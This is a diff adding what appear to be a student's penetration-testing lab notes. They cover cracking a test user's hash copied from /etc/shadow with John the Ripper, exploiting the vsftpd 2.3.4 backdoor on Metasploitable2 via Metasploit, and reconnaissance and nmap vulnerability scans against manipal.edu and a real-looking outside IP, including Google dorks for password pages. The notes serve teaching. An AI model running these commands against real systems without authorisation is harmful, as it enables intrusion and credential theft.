@@ -1,0 +1,140 @@
+Password Cracking
+
+
+sudo useradd tempusr
+sudo passwd tempusr
+sudo cat /etc/shadow
+nano wordlists.txt
+sudo cat /etc/shadow > hash.txt
+awk -F: '/^tempusr/{print $1 ":" $2}' hash.txt > temp_passwd.txt
+sudo john --format=crypt -wordlist=wordlists.txt temp_passwd.txt
+sudo john --show temp_passwd.txt
+
+
+
+Exploitation on Metasploitable2
+
+ifconfig  - on both kali and metasploitable
+
+msfconsole
+
+
+
+Check database status (db_status)– usually will not be connected (optional)
+search vsftpd 2.3.4 – one of the kind of exploitation through backdoor
+
+
+use 0  - start using that exploitation and set the IP’s to move further
+
+
+set RHOSTS 10.0.2.4  - setting target host with its ipaddress
+show options  - to check weather the ip is set to RHOSTS or not
+
+
+set LHOST 10.0.2.15  - setting local host kali ipaddress
+show options
+
+exploit  -  starts exploiting 
+
+sessions
+sessions -i 1
+sysinfo 
+ifconfig
+change directory and create files in kali and check the same appears in Metasploit 
+
+
+
+Vulnerability Assessment
+
+1. Passive Reconnaissance
+
+i.whois manipal.edu
+ii.dig manipal.edu
+iii.nslookup manipal.edu
+iv.host manipal.edu
+v.theHarvester -d manipal.edu -b yahoo -l 100
+vi.theHarvester -d manipal.edu -b crtsh,hackertarget,rapiddns,urlscan
+vii.site:manipal.edu filetype:pdf
+viii.site:manipal.edu inurl:login 
+ix.site:manipal.edu intitle:password 
+x.Social Media and Public Records 
+sudo arp-scan –localnet  => to check for connected hosts to the same network
+
+2. Active Reconnaissance
+
+ping -n 4 example.com
+nmap 172.66.147.243
+
+
+nmap -p 21,22,23,25,80,139,445 172.66.147.243
+
+
+nmap -F 172.66.147.243
+
+
+nmap -Pn 172.66.147.243
+
+
+nmap --open 172.66.147.243
+
+
+nmap -sV 172.66.147.243
+
+
+sudo nmap -O 172.66.147.243
+
+
+sudo nmap -sn 172.66.147.243
+
+sudo nmap -sS -sV -O -sC 172.66.147.243
+
+
+traceroute example.com
+
+
+curl -I https://example.com
+
+curl -v https://example.com
+
+
+sudo nmap -O -traceroute 172.66.147.243
+
+
+nmap --script vulners 172.66.147.243
+
+nmap --script malware 172.66.147.243
+
+
+nmap --script vuln 172.66.147.243
+
+
+nmap -sV --script vulners 172.66.147.243
+
+nmap -sV --script vuln --script-args vulscandedup=1 172.66.147.243
+
+
+nmap -sV --script vuln --script-args vulscanmincvss=3 172.66.147.243
+
+
+
+| No. | Command | One-line explanation | Example |
+
+| **i** | `whois manipal.edu` | Shows **domain registration and ownership information**. | `whois google.com` |
+| **ii** | `dig manipal.edu` | Performs a **DNS lookup** and shows DNS records such as IP information. | `dig google.com` |
+| **iii** | `nslookup manipal.edu` | Finds the **IP address of a domain using DNS**. | `nslookup google.com` |
+| **iv** | `host manipal.edu` | Quickly shows the **IP address/DNS information** of a domain. | `host google.com` |
+| **v** | `theHarvester -d manipal.edu -b yahoo -l 100` | Collects **publicly available information** such as emails and hosts from Yahoo, limited to 100 results. | `theHarvester -d example.com -b yahoo -l 100` |
+| **vi** | `theHarvester -d manipal.edu -b crtsh,hackertarget,rapiddns,urlscan` | Collects publicly available **domains, hosts and related information** from multiple sources. | `theHarvester -d example.com -b crtsh,hackertarget,rapiddns,urlscan` |
+| **vii** | `site:manipal.edu filetype:pdf` | Google search to find **PDF files available on manipal.edu**. | `site:google.com filetype:pdf` |
+| **viii** | `site:manipal.edu inurl:login` | Searches for pages on the domain containing **“login” in the URL**. | `site:example.com inurl:login` |
+| **ix** | `site:manipal.edu intitle:password` | Searches for pages on the domain having **“password” in the page title**. | `site:example.com intitle:password` |
+| **x** | `sudo arp-scan --localnet` | Scans the **local network** to find connected hosts/devices. | `sudo arp-scan --localnet` |
+
+
+
+
+
+
+
+
+
